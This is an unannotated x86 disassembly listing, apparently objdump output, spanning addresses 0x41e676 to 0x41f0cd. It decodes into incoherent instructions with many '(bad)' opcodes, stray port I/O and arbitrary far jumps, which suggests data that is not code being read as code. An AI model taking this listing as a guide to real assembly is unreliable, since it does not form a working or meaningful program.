  41e676:	mov    ebp,0x977991d8
  41e67b:	stos   BYTE PTR es:[edi],al
  41e67c:	ss pop edx
  41e67e:	jo     0x41e6c4
  41e680:	inc    edx
  41e681:	mov    ds:0x799f5c3a,eax
  41e686:	xor    BYTE PTR [esi],al
  41e688:	stos   BYTE PTR es:[edi],al
  41e689:	lahf   
  41e68a:	cld    
  41e68b:	xor    DWORD PTR [ebp-0x632e5165],ebx
	...
  41e6f1:	add    BYTE PTR [eax],al
  41e6f3:	add    ch,al
  41e6f5:	cwde   
  41e6f6:	loope  0x41e74d
  41e6f8:	std    
  41e6f9:	jge    0x41e6f0
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    esi,DWORD PTR [edi+0xc19beff]
  41e705:	inc    esp
  41e706:	add    DWORD PTR [eax],eax
  41e708:	add    eax,0xed000001
  41e70d:	and    esp,DWORD PTR [ebx+0x52]
  41e710:	outs   dx,DWORD PTR ds:[esi]
  41e711:	out    0xf2,eax
  41e713:	cwde   
  41e714:	mov    ds:0x716f6257,eax
  41e719:	mov    ebx,0x972c10f1
  41e71e:	leave  
  41e71f:	mov    esi,0xf698dd50
  41e724:	stos   BYTE PTR es:[edi],al
  41e725:	inc    eax
  41e726:	mov    ah,0xbb
  41e728:	pop    esi
  41e729:	push   eax
  41e72a:	adc    DWORD PTR [esi],0xfb416e45
  41e730:	xor    ebp,DWORD PTR [ebp-0x339af573]
  41e736:	inc    esp
  41e737:	pop    esi
  41e738:	mov    al,BYTE PTR [esi]
  41e73a:	xchg   esp,eax
  41e73b:	popf   
  41e73c:	mov    BYTE PTR [eax+0x3f],dh
  41e73f:	jno    0x41e77e
  41e741:	pusha  
  41e742:	fcomp  st(6)
  41e744:	pop    edx
  41e745:	jge    0x41e6d2
  41e747:	cs pop ebp
  41e749:	ror    DWORD PTR es:[ebx+esi*4-0x197f887c],cl
  41e751:	inc    esi
  41e752:	call   0xc202100
  41e757:	inc    eax
  41e758:	mov    ebp,0x996d03ef
  41e75d:	mov    edi,0xf6f9376b
  41e762:	je     0x41e713
  41e764:	sbb    edi,0x8c12094b
  41e76a:	les    eax,FWORD PTR [ebp+0x5a7e92b3]
  41e770:	sbb    BYTE PTR [esi+edx*4],dl
  41e773:	xchg   ebp,eax
  41e774:	xchg   ebx,eax
  41e775:	iret   
  41e776:	lods   eax,DWORD PTR ds:[esi]
  41e777:	jnp    0x41e7c7
  41e779:	shl    DWORD PTR [ebp-0x6e],1
  41e77c:	addr16 iret 
  41e77e:	pop    esi
  41e77f:	test   al,0xb9
  41e781:	push   edx
  41e782:	add    DWORD PTR [ebx],edi
  41e784:	ret    
  41e785:	inc    esp
  41e786:	mov    edx,0xe8224ae
  41e78b:	ror    BYTE PTR [edx+edx*2],0xf4
  41e78f:	mov    bl,0xed
  41e791:	dec    edi
  41e792:	repnz mov es:0x68875ae7,al
  41e799:	mov    ds:0x913ea7e7,al
  41e79e:	fwait
  41e79f:	lods   al,BYTE PTR ds:[esi]
  41e7a0:	fisttp QWORD PTR [ebp+0x18]
  41e7a3:	and    eax,0x48ea9d10
  41e7a8:	push   ebx
  41e7a9:	ret    
  41e7aa:	push   ds
  41e7ab:	mov    esi,0x44e25467
  41e7b0:	sbb    dh,BYTE PTR [edx-0x2604f3ce]
  41e7b6:	call   0x512064c6
  41e7bb:	popw   es
  41e7bd:	add    al,0x26
  41e7bf:	xor    ah,BYTE PTR [edi-0x25a45006]
  41e7c5:	push   cs
  41e7c6:	pop    esi
  41e7c7:	mov    eax,ds:0x5d6b6bdc
  41e7cc:	mov    edx,0x4df764cf
  41e7d1:	in     eax,0x69
  41e7d3:	fstp   QWORD PTR [eax]
  41e7d5:	in     eax,0xa7
  41e7d7:	push   es
  41e7d8:	sub    eax,0xd7cc3626
  41e7dd:	add    bl,dh
  41e7df:	jne    0x41e84b
  41e7e1:	adc    al,0x7f
  41e7e3:	push   esi
  41e7e4:	or     DWORD PTR [di-0x45cb],eax
  41e7e9:	xchg   BYTE PTR [ecx+esi*4],ch
  41e7ec:	ja     0x41e7f3
  41e7ee:	sub    DWORD PTR [ecx-0x4614ac5b],0xcfc1c02b
  41e7f8:	dec    eax
  41e7f9:	jmp    0xe019:0xa5be2caf
  41e800:	lea    ebp,ds:0xf739274d
  41e806:	sbb    BYTE PTR [edi-0x59],dh
  41e809:	sti    
  41e80a:	(bad)  
  41e80b:	mov    edx,0x445409ea
  41e810:	xchg   esi,eax
	...
  41e871:	add    BYTE PTR [eax],al
  41e873:	add    BYTE PTR ds:0x9e5c8a39,ch
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e863
  41e881:	push   esi
  41e882:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e883:	loope  0x41e896
  41e885:	inc    ebp
  41e886:	add    DWORD PTR [eax],eax
  41e888:	add    eax,0x34000001
  41e88d:	loope  0x41e88f
  41e88f:	aas    
  41e890:	cli    
  41e891:	mov    ds:0x2585267e,eax
  41e896:	adc    eax,0x3422629e
  41e89b:	mov    esp,0x84036464
  41e8a0:	cmp    esp,esp
  41e8a2:	shl    edi,cl
  41e8a4:	mov    dl,0x55
  41e8a6:	pop    eax
  41e8a7:	lds    ebx,FWORD PTR [esi+0x42d2f365]
  41e8ad:	ror    BYTE PTR [ebp+0x2783909e],0x39
  41e8b4:	jae    0x41e86f
  41e8b6:	repz xlat BYTE PTR ds:[ebx]
  41e8b8:	int    0x99
  41e8ba:	mov    BYTE PTR [ecx],al
  41e8bc:	mov    eax,ds:0x2f7a9b82
  41e8c1:	jbe    0x41e92e
  41e8c3:	call   0x6eeb:0xa8123fde
  41e8ca:	leave  
  41e8cb:	imul   esi,DWORD PTR ds:0x6be1649c,0xd328122a
  41e8d5:	retf   0xb48d
  41e8d8:	(bad)  
  41e8d9:	out    0x10,eax
  41e8db:	cli    
  41e8dc:	and    cl,BYTE PTR [edx-0x91c09ef]
  41e8e2:	sbb    eax,ecx
  41e8e4:	es stc 
  41e8e6:	mov    bl,0x12
  41e8e8:	gs push ebp
  41e8ea:	sbb    BYTE PTR [edx],al
  41e8ec:	(bad)  
  41e8ee:	fdivr  DWORD PTR [esi-0x570e6573]
  41e8f4:	fist   WORD PTR [edx+esi*2+0x3978d9c7]
  41e8fb:	jbe    0x41e8cd
  41e8fd:	dec    edi
  41e8fe:	jnp    0x41e951
  41e900:	(bad)  
  41e901:	stc    
  41e902:	and    ebx,esi
  41e904:	xlat   BYTE PTR ds:[ebx]
  41e905:	out    dx,al
  41e906:	and    BYTE PTR ds:0x7c40b332,0xbf
  41e90e:	xchg   DWORD PTR [ebx+ebx*4+0x295e5ddb],edi
  41e915:	or     eax,0xf8482740
  41e91a:	push   es
  41e91b:	mov    ds:0x5eeec0d2,al
  41e920:	jo     0x41e972
  41e922:	push   esp
  41e923:	or     eax,0x8a9361e2
  41e928:	adc    eax,0x12357f0e
  41e92d:	pop    edx
  41e92e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e92f:	jmp    DWORD PTR [ecx+ebp*4]
  41e932:	fs out 0x4f,al
  41e935:	mov    dl,0x9c
  41e937:	in     eax,0xb5
  41e939:	pushf  
  41e93a:	mov    bl,0xa1
  41e93c:	add    edi,ebx
  41e93e:	pop    ebp
  41e93f:	nop    DWORD PTR [ebp+0x7b]
  41e943:	fdiv   st,st(3)
  41e945:	push   ss
  41e946:	dec    edi
  41e947:	bound  eax,QWORD PTR [esi+0x53]
  41e94a:	mov    WORD PTR [edx+0x4f],?
  41e94d:	sub    al,0x63
  41e94f:	pop    ss
  41e950:	add    al,0xe2
  41e952:	pop    edx
  41e953:	repz aam 0x95
  41e956:	and    DWORD PTR [edi+ebp*1+0x30e57957],edx
  41e95d:	loop   0x41e95e
  41e95f:	sub    al,0xe0
  41e961:	lock mov edi,0x865a35f2
  41e967:	add    eax,0xc0c0b46b
  41e96c:	out    0x6a,al
  41e96e:	test   al,0x18
  41e970:	adc    dh,BYTE PTR [eax]
  41e972:	cld    
  41e973:	mov    BYTE PTR [ebp-0x43f4078b],dh
  41e979:	sbb    edx,DWORD PTR [si-0x365b]
  41e97e:	enter  0xf8c3,0x89
  41e982:	rol    dh,0x62
  41e985:	pop    es
  41e986:	jmp    DWORD PTR [edi+0x2]
  41e989:	jae    0x41e92c
  41e98b:	dec    ecx
  41e98c:	push   ecx
  41e98d:	push   0x9070f4
	...
  41e9f2:	add    BYTE PTR [eax],al
  41e9f4:	js     0x41e9f3
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	dec    esp
  41ea01:	mov    bh,0xf0
  41ea03:	or     edx,DWORD PTR [esi]
  41ea05:	inc    esi
  41ea06:	add    DWORD PTR [eax],eax
  41ea08:	add    eax,0xd0000001
  41ea0d:	xchg   ebp,eax
  41ea0e:	stc    
  41ea0f:	cmc    
  41ea10:	in     eax,dx
  41ea11:	and    ch,BYTE PTR [ecx]
  41ea13:	lds    esp,FWORD PTR [ebx-0x2b]
  41ea16:	mov    eax,ds:0x8dc955ab
  41ea1b:	fadd   DWORD PTR [eax+0x57]
  41ea1e:	cmp    DWORD PTR [ecx+0x13],ebx
  41ea21:	mov    ds:0x2bea1238,eax
  41ea26:	fs call 0x8d1a8284
  41ea2c:	ret    0x3f4a
  41ea2f:	lods   eax,DWORD PTR ds:[esi]
  41ea30:	or     BYTE PTR ds:0x3083b875,bl
  41ea36:	repz sub ch,al
  41ea39:	ret    
  41ea3a:	aas    
  41ea3b:	rol    DWORD PTR [edi+0x4adc2d12],cl
  41ea41:	fiadd  DWORD PTR [edx]
  41ea43:	pop    ds
  41ea44:	inc    edx
  41ea45:	xchg   ebx,eax
  41ea46:	xor    BYTE PTR [edi],cl
  41ea48:	push   eax
  41ea49:	retf   
  41ea4a:	loopne 0x41ea68
  41ea4c:	call   0xc14f:0x5ac6374c
  41ea53:	jae    0x41ea57
  41ea55:	inc    ebp
  41ea56:	dec    ecx
  41ea57:	dec    edx
  41ea58:	fnstsw WORD PTR [ebx+ebx*1+0x51]
  41ea5c:	adc    eax,0xfb6f6a4f
  41ea61:	out    0xd5,al
  41ea63:	jbe    0x41eacf
  41ea65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea66:	adc    al,0x40
  41ea68:	call   FWORD PTR [ebp+0x18bba18a]
  41ea6e:	cmp    BYTE PTR [esi],bh
  41ea70:	(bad)  
  41ea72:	cmc    
  41ea73:	add    DWORD PTR [ecx+esi*1],eax
  41ea76:	addr16 mov edi,0x8009dca6
  41ea7c:	nop
  41ea7d:	pop    eax
  41ea7e:	cmp    DWORD PTR [edi-0x304d60c9],esi
  41ea84:	mov    edx,0xbb357560
  41ea89:	sbb    eax,0x67499e44
  41ea8e:	sar    BYTE PTR fs:0x36d49669,cl
  41ea95:	mov    esp,0xe0a2c1ee
  41ea9a:	sub    bh,bl
  41ea9c:	sub    DWORD PTR [edx],edi
  41ea9e:	and    dl,BYTE PTR [edx+0x74]
  41eaa1:	popf   
  41eaa2:	dec    ebx
  41eaa3:	xchg   ecx,eax
  41eaa4:	iret   
  41eaa5:	dec    ecx
  41eaa6:	scas   eax,DWORD PTR es:[edi]
  41eaa7:	mov    ds:0x9ca6b31,eax
  41eaac:	stos   DWORD PTR es:[edi],eax
  41eaad:	mov    BYTE PTR es:[ebp+0x50],bh
  41eab1:	cld    
  41eab2:	push   edx
  41eab3:	sub    edi,DWORD PTR [edx+0x10]
  41eab6:	shr    DWORD PTR [ebx+edi*8-0x3b],cl
  41eaba:	add    eax,0xd3139bd0
  41eabf:	push   es
  41eac0:	adc    ah,0x8e
  41eac3:	test   eax,0x5b59d2c6
  41eac8:	jns    0x41eaa2
  41eaca:	test   eax,0x7524d5f
  41eacf:	jnp    0x41ea9a
  41ead1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ead2:	gs pop es
  41ead4:	adc    edx,DWORD PTR [esi+esi*4+0x54]
  41ead8:	in     eax,dx
  41ead9:	push   ds
  41eada:	push   ds
  41eadb:	(bad)  
  41eadc:	cdq    
  41eadd:	mov    dl,0x73
  41eadf:	iret   
  41eae0:	cs mov eax,0x1b37e54
  41eae6:	ja     0x41eae0
  41eae8:	jmp    0x41eb4d
  41eaea:	mov    al,ds:0x8b7ea487
  41eaef:	push   ebx
  41eaf0:	in     eax,dx
  41eaf1:	inc    ebp
  41eaf2:	xchg   esi,eax
  41eaf3:	pop    ebx
  41eaf4:	and    al,BYTE PTR [ebx-0x60689878]
  41eafa:	inc    edi
  41eafb:	push   0x64e12302
  41eb00:	jl     0x41eb2a
  41eb02:	in     eax,0xff
  41eb04:	mov    al,0xb3
  41eb06:	jbe    0x41eb03
  41eb08:	leave  
  41eb09:	aaa    
  41eb0a:	jae    0x41eae1
  41eb0c:	xchg   BYTE PTR [edx-0x18],ah
  41eb0f:	(bad)  
  41eb10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  41eb71:	add    BYTE PTR [eax],al
  41eb73:	add    BYTE PTR [edx],dl
  41eb75:	das    
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0x62
  41eb81:	jne    0x41ebc8
  41eb83:	stc    
  41eb84:	sbb    eax,DWORD PTR [edi+0x1]
  41eb87:	add    BYTE PTR ds:0xe9000001,al
  41eb8d:	cdq    
  41eb8e:	sbb    eax,DWORD PTR [eax]
  41eb90:	jecxz  0x41eb43
  41eb92:	clc    
  41eb93:	sbb    BYTE PTR [ebp-0x47b2623b],0xf3
  41eb9a:	or     ebp,DWORD PTR [edi]
  41eb9c:	fdiv   QWORD PTR [ebp-0x41]
  41eb9f:	lock add BYTE PTR [esi-0x7b6669dd],bl
  41eba6:	ret    
  41eba7:	cmp    bh,BYTE PTR [ecx-0xd]
  41ebaa:	scas   eax,DWORD PTR es:[edi]
  41ebab:	push   ecx
  41ebac:	(bad)
  41ebb0:	xor    eax,0xd724e799
  41ebb5:	loope  0x41ebad
  41ebb7:	inc    edi
  41ebb8:	sbb    al,0xa2
  41ebba:	in     al,0x3
  41ebbc:	sub    al,0x14
  41ebbe:	cwde   
  41ebbf:	sub    DWORD PTR [edi+ebx*8-0x35cc4aa8],ebp
  41ebc6:	fwait
  41ebc7:	and    esp,DWORD PTR [edx+ecx*2-0x67]
  41ebcb:	or     DWORD PTR [esi-0x74],edi
  41ebce:	pusha  
  41ebcf:	popa   
  41ebd0:	out    dx,al
  41ebd1:	lock in al,dx
  41ebd3:	jmp    0xdae72328
  41ebd8:	or     DWORD PTR [edi],edi
  41ebda:	out    0x7a,eax
  41ebdc:	std    
  41ebdd:	daa    
  41ebde:	gs jmp 0xa6dc:0x73e134d
  41ebe6:	in     al,dx
  41ebe7:	sub    esi,eax
  41ebe9:	js     0x41ec09
  41ebeb:	mov    ch,ch
  41ebed:	das    
  41ebee:	mov    bl,0xa1
  41ebf0:	out    dx,al
  41ebf1:	inc    BYTE PTR [ebx-0x2e1bca36]
  41ebf7:	(bad)  
  41ebf8:	cmp    BYTE PTR [edi+0x4e65d833],ah
  41ebfe:	add    ebp,DWORD PTR [edi+esi*4]
  41ec01:	xor    eax,0xa4c1d44c
  41ec06:	(bad)  
  41ec07:	fidivr DWORD PTR [eax]
  41ec09:	mov    dl,0x58
  41ec0b:	pop    esp
  41ec0c:	push   ecx
  41ec0d:	cmp    DWORD PTR [ebx+0x73],0x114dea08
  41ec14:	cmp    DWORD PTR [edx+esi*2+0x71c64cba],0x68
  41ec1c:	jmp    0x41ec8a
  41ec1e:	push   ebx
  41ec1f:	lds    ebp,FWORD PTR [ebx-0x6eb672a3]
  41ec25:	cmp    esp,ebp
  41ec27:	and    eax,0x1101a4d2
  41ec2c:	js     0x41ec14
  41ec2e:	push   ebp
  41ec2f:	addr16 mov bl,0x9b
  41ec32:	fldenv [eax]
  41ec34:	mov    al,0x5e
  41ec36:	aas    
  41ec37:	outs   dx,BYTE PTR ds:[esi]
  41ec38:	mov    eax,0x802fc446
  41ec3d:	lods   eax,DWORD PTR ds:[esi]
  41ec3e:	ficomp DWORD PTR [ecx]
  41ec40:	aaa    
  41ec41:	mov    ah,0x59
  41ec43:	sub    al,0xc3
  41ec45:	loope  0x41ec29
  41ec47:	sub    eax,0xe3354fae
  41ec4c:	in     al,0xdd
  41ec4e:	popf   
  41ec4f:	mov    eax,ds:0x9f075984
  41ec54:	outs   dx,BYTE PTR ds:[esi]
  41ec55:	add    DWORD PTR [eax],esi
  41ec57:	call   0x925652a7
  41ec5c:	ins    BYTE PTR es:[edi],dx
  41ec5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec5e:	mov    eax,ds:0xe066f50a
  41ec63:	inc    eax
  41ec64:	fwait
  41ec65:	pop    edi
  41ec66:	sub    al,0xad
  41ec68:	iret   
  41ec69:	adc    ebx,esp
  41ec6b:	std    
  41ec6c:	dec    edx
  41ec6d:	mov    WORD PTR [eax-0x4e],es
  41ec70:	out    dx,eax
  41ec71:	fld    TBYTE PTR [edi+0xa]
  41ec74:	stc    
  41ec75:	push   es
  41ec76:	(bad)
  41ec7a:	mov    ch,BYTE PTR [ecx-0x4c]
  41ec7d:	pop    ds
  41ec7e:	sub    ah,ah
  41ec80:	repz in al,dx
  41ec82:	mov    eax,ds:0xd1479c78
  41ec87:	stc    
  41ec88:	or     dl,BYTE PTR [esi+0x3577826]
  41ec8e:	mov    BYTE PTR [esi+0x54],dl
	...
  41ecf4:	inc    ecx
  41ecf5:	icebp  
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0x21185fd0
  41ed02:	sub    DWORD PTR [ebp+0x20],edx
  41ed05:	dec    eax
  41ed06:	add    DWORD PTR [eax],eax
  41ed08:	add    eax,0x23000001
  41ed0d:	push   0x668a8330
  41ed12:	shl    DWORD PTR [ecx+ebx*2-0x24],1
  41ed16:	dec    edx
  41ed17:	sbb    eax,0x71beaea
  41ed1c:	adc    bl,dh
  41ed1e:	scas   eax,DWORD PTR es:[edi]
  41ed1f:	sbb    BYTE PTR [eax+0x56],bh
  41ed22:	adc    BYTE PTR ds:0x76148de4,bl
  41ed28:	stos   BYTE PTR es:[edi],al
  41ed29:	xchg   ebp,eax
  41ed2a:	out    0xa9,al
  41ed2c:	pop    esp
  41ed2d:	xchg   esi,eax
  41ed2e:	push   edi
  41ed2f:	(bad)  
  41ed30:	ins    BYTE PTR es:[edi],dx
  41ed31:	inc    ebp
  41ed32:	arpl   WORD PTR [ecx-0x746a7554],cx
  41ed38:	dec    ebp
  41ed39:	iret   
  41ed3a:	xor    ecx,DWORD PTR [eax+0x3e4333f4]
  41ed40:	in     al,0xe7
  41ed42:	dec    DWORD PTR [ebp-0xef3841a]
  41ed48:	add    dl,BYTE PTR [ecx+0x1e8e4935]
  41ed4e:	xchg   ebx,eax
  41ed4f:	lea    edi,[eax]
  41ed51:	(bad)  
  41ed52:	daa    
  41ed53:	fwait
  41ed54:	sbb    al,0xd9
  41ed56:	shl    BYTE PTR [eax-0x697a174f],0x63
  41ed5d:	mov    dh,0x28
  41ed5f:	pop    edx
  41ed60:	(bad)  
  41ed61:	iret   
  41ed62:	cli    
  41ed63:	jns    0x41ed41
  41ed65:	and    BYTE PTR [esi],al
  41ed67:	jmp    0x41ed0c
  41ed69:	cmc    
  41ed6a:	mov    ah,0xfe
  41ed6c:	adc    eax,0xc8bd1966
  41ed71:	test   eax,0x97f2c8b8
  41ed76:	cmp    DWORD PTR [ecx-0x4e],ebp
  41ed79:	xchg   edi,eax
  41ed7a:	sbb    eax,edx
  41ed7c:	pusha  
  41ed7d:	arpl   WORD PTR [esi],sp
  41ed7f:	dec    edx
  41ed80:	rcr    dl,1
  41ed82:	inc    esp
  41ed83:	fbstp  TBYTE PTR [eax-0x1158cd5f]
  41ed89:	or     ebp,esp
  41ed8b:	call   ebx
  41ed8d:	mov    al,0xe3
  41ed8f:	xor    BYTE PTR [edi],0xf1
  41ed92:	jmp    esp
  41ed94:	cmp    ch,BYTE PTR [ecx]
  41ed96:	jmp    0x8b914935
  41ed9b:	jae    0x41ed41
  41ed9d:	sahf   
  41ed9e:	or     dl,bl
  41eda0:	xchg   edi,eax
  41eda1:	or     DWORD PTR ds:0x86d01d9a,ebx
  41eda7:	pop    ss
  41eda8:	dec    esi
  41eda9:	adc    eax,0xaaca9c68
  41edae:	sub    BYTE PTR [ebp-0x73669cc2],dh
  41edb4:	xchg   ecx,eax
  41edb5:	mov    al,ds:0x8775541d
  41edba:	mov    bh,BYTE PTR [esp+0x0]
  41edbe:	aaa    
  41edbf:	inc    edx
  41edc0:	pop    edx
  41edc1:	xchg   esp,eax
  41edc2:	push   0x4b87793d
  41edc7:	jno    0x41ed82
  41edc9:	mov    ss,WORD PTR [ebp+0x17]
  41edcc:	sbb    dh,ah
  41edce:	inc    edx
  41edcf:	mov    ds:0x216a94ad,al
  41edd4:	sbb    eax,0xcf0355e5
  41edd9:	mov    BYTE PTR [edi+eiz*8],dl
  41eddc:	sti    
  41eddd:	inc    ecx
  41edde:	or     DWORD PTR [ebx],ebx
  41ede0:	push   ecx
  41ede1:	push   ss
  41ede2:	(bad)  
  41ede3:	in     al,0x72
  41ede5:	push   edi
  41ede6:	jl     0x41ee04
  41ede8:	test   eax,0xc1edb356
  41eded:	jmp    0xc82d:0xb2baee04
  41edf4:	test   DWORD PTR [ecx-0x324c8b70],eax
  41edfa:	lock fisubr DWORD PTR [esi+0x66649ca]
  41ee01:	sub    DWORD PTR [edi-0xd86f5f7],0x26b802d4
  41ee0b:	and    edi,esi
  41ee0d:	(bad)  
  41ee0e:	in     al,0x22
  41ee10:	scas   al,BYTE PTR es:[edi]
	...
  41ee71:	add    BYTE PTR [eax],al
  41ee73:	add    BYTE PTR ds:0x7b197956,al
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0x25af:0x48d2dee7
  41ee85:	dec    ecx
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    eax,0xc4000001
  41ee8d:	repz pusha 
  41ee8f:	mov    dl,0xd1
  41ee91:	fcomip st,st(1)
  41ee93:	push   eax
  41ee94:	ins    BYTE PTR es:[edi],dx
  41ee95:	imul   ch
  41ee97:	add    edx,esi
  41ee99:	fwait
  41ee9a:	pop    esi
  41ee9b:	dec    eax
  41ee9c:	cwde   
  41ee9d:	mov    ch,0x66
  41ee9f:	push   ebp
  41eea0:	adc    al,0xea
  41eea2:	popa   
  41eea3:	sbb    DWORD PTR [edx-0x5cb9ec16],0xffffff8b
  41eeaa:	sub    BYTE PTR [edi+0x41],dh
  41eead:	jno    0x41ee9a
  41eeaf:	nop
  41eeb0:	lods   eax,DWORD PTR ds:[esi]
  41eeb1:	sbb    al,0x31
  41eeb3:	imul   DWORD PTR [ebx]
  41eeb5:	daa    
  41eeb6:	sub    edx,DWORD PTR [edx+eax*8+0x31]
  41eeba:	frstor [ebp+0x62f324d8]
  41eec0:	and    eax,0x8f8743cc
  41eec5:	pop    ds
  41eec6:	xchg   edx,eax
  41eec7:	add    al,0x70
  41eec9:	jl     0x41ee75
  41eecb:	in     eax,dx
  41eecc:	inc    edx
  41eecd:	pop    eax
  41eece:	out    0x82,eax
  41eed0:	add    ebx,DWORD PTR [ebp+0x5d81b2e9]
  41eed6:	in     eax,0xc1
  41eed8:	xchg   edx,eax
  41eed9:	scas   eax,DWORD PTR es:[edi]
  41eeda:	sbb    al,0x2
  41eedc:	dec    esi
  41eedd:	lods   eax,DWORD PTR ds:[esi]
  41eede:	inc    ecx
  41eedf:	adc    DWORD PTR [ecx-0x4e33066d],0x86be353d
  41eee9:	mov    ds:0xd513e1ba,eax
  41eeee:	icebp  
  41eeef:	push   0xffffffb7
  41eef1:	shr    BYTE PTR [ebx+0x27],cl
  41eef4:	loop   0x41eef9
  41eef6:	outs   dx,DWORD PTR ds:[esi]
  41eef7:	aaa    
  41eef8:	add    esp,esp
  41eefa:	jne    0x41eeb4
  41eefc:	jl     0x41ee89
  41eefe:	xor    ebp,ebp
  41ef00:	mov    al,ds:0x490af7f1
  41ef05:	sar    BYTE PTR [ecx-0x54],1
  41ef08:	outs   dx,DWORD PTR ds:[esi]
  41ef09:	loopne 0x41ef4b
  41ef0b:	jmp    0xf091:0x19364472
  41ef12:	push   0xffffffb2
  41ef14:	(bad)  
  41ef15:	fiadd  WORD PTR [edx]
  41ef17:	sti    
  41ef18:	and    bl,BYTE PTR [ebp-0x48]
  41ef1b:	test   eax,0xb8ba082
  41ef20:	fwait
  41ef21:	ret    0xe207
  41ef24:	adc    DWORD PTR [edx+0x53],ecx
  41ef27:	ds ret 0x3a7a
  41ef2b:	retf   0x25a7
  41ef2e:	mov    bl,al
  41ef30:	cmp    eax,0x3ce3b0b6
  41ef35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef36:	in     al,0x75
  41ef38:	mov    ebp,0x9bedf71c
  41ef3d:	test   BYTE PTR [ebp-0xed98cf8],bh
  41ef43:	test   BYTE PTR [ecx+0x4d9a2912],cl
  41ef49:	idiv   BYTE PTR [ebp-0x63cb3b19]
  41ef4f:	(bad)  [edx]
  41ef51:	test   DWORD PTR [edx-0x7027c1f2],edx
  41ef57:	int    0xc1
  41ef59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef5a:	add    BYTE PTR [eax-0x65],al
  41ef5d:	push   esp
  41ef5e:	mov    eax,0x932b8e70
  41ef63:	add    BYTE PTR [eax],ah
  41ef65:	pop    eax
  41ef66:	inc    edx
  41ef67:	enter  0x8c7f,0xff
  41ef6b:	retf   
  41ef6c:	popa   
  41ef6d:	aam    0x21
  41ef6f:	xchg   edi,eax
  41ef70:	ffreep st(6)
  41ef72:	mov    edx,0xedb5f332
  41ef77:	mov    ebp,0x6fa5c377
  41ef7c:	out    dx,eax
  41ef7d:	mov    ecx,DWORD PTR [eax+0x6fab582d]
  41ef83:	sahf   
  41ef84:	jmp    0xfce3455a
  41ef89:	call   0xfcda9b21
  41ef8e:	data16 out dx,al
  41ef90:	call   0x41ef95
	...
  41eff1:	add    BYTE PTR [eax],al
  41eff3:	add    BYTE PTR [ecx-0xda40a3],bh
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul esi,DWORD PTR [esi-0x51],0x22
  41f003:	imul   ebp,DWORD PTR [edx],0x500014a
  41f009:	add    DWORD PTR [eax],eax
  41f00b:	add    BYTE PTR [esi],al
  41f00d:	adc    eax,DWORD PTR [ebx+0x598fc82e]
  41f013:	mov    al,ds:0x6635cbf9
  41f018:	mov    edx,0x8de28e41
  41f01d:	cwde   
  41f01e:	das    
  41f01f:	(bad)  
  41f020:	cli    
  41f021:	scas   al,BYTE PTR es:[edi]
  41f022:	ds mov cl,0xb4
  41f025:	cmp    dl,BYTE PTR es:[edx+0x44277747]
  41f02c:	xchg   ecx,eax
  41f02d:	add    BYTE PTR [edx+eiz*2+0x54],bl
  41f031:	or     al,BYTE PTR [ebx+0x736ff859]
  41f037:	cmp    BYTE PTR ds:0xd4958069,dh
  41f03d:	xchg   esi,eax
  41f03e:	dec    ebp
  41f03f:	jge    0x41f0bb
  41f041:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f042:	cmp    DWORD PTR [edi-0x27],ebx
  41f045:	xor    bh,BYTE PTR [ebx+edi*8+0x1d]
  41f049:	inc    ebp
  41f04a:	int    0x59
  41f04c:	and    edx,DWORD PTR [esi]
  41f04e:	or     eax,DWORD PTR [ecx+ebx*8+0x2ac3c2d0]
  41f055:	shl    ecx,cl
  41f057:	mov    ebp,0x81e135e1
  41f05c:	push   esp
  41f05d:	aaa    
  41f05e:	mov    ebx,0xe7abf518
  41f063:	bound  esi,QWORD PTR [edi-0x64ab1158]
  41f069:	(bad)  
  41f06a:	ficomp WORD PTR [esi+0x35]
  41f06d:	loop   0x41f03c
  41f06f:	jne    0x41f04a
  41f071:	psraw  mm5,QWORD PTR [ecx-0x3911bb35]
  41f078:	lea    edi,ds:[eax+eiz*2]
  41f07c:	repz repz out dx,eax
  41f07f:	cmp    eax,0xa2854ad4
  41f084:	dec    esp
  41f085:	out    0xeb,eax
  41f087:	mov    ebx,0x9880d158
  41f08c:	out    dx,al
  41f08d:	(bad)  
  41f08e:	(bad)  
  41f08f:	das    
  41f090:	mov    cl,0x2b
  41f092:	cmp    eax,0xe26d02f
  41f097:	aad    0xac
  41f099:	push   ecx
  41f09a:	cmp    edi,edi
  41f09c:	into   
  41f09d:	mov    al,ds:0xdbd0f021
  41f0a2:	gs imul ecx,ebx,0xffffffda
  41f0a6:	adc    bl,al
  41f0a8:	xchg   ecx,eax
  41f0a9:	mov    al,ds:0xbc34f60b
  41f0ae:	xchg   esi,eax
  41f0af:	push   ebp
  41f0b0:	push   ecx
  41f0b1:	in     eax,dx
  41f0b2:	lea    edx,[esi]
  41f0b4:	or     DWORD PTR [edi],ebp
  41f0b6:	loope  0x41f135
  41f0b8:	pop    ss
  41f0b9:	dec    edx
  41f0ba:	dec    esp
  41f0bb:	lods   eax,DWORD PTR ds:[esi]
  41f0bc:	sub    DWORD PTR [ebx],edi
  41f0be:	add    bl,BYTE PTR [edx+0x107a4d41]
  41f0c4:	out    0x50,eax
  41f0c6:	cmp    eax,0x6976f5de
  41f0cb:	sbb    al,0x1b
  41f0cd:	scas   al,BYTE PTR es:[edi]
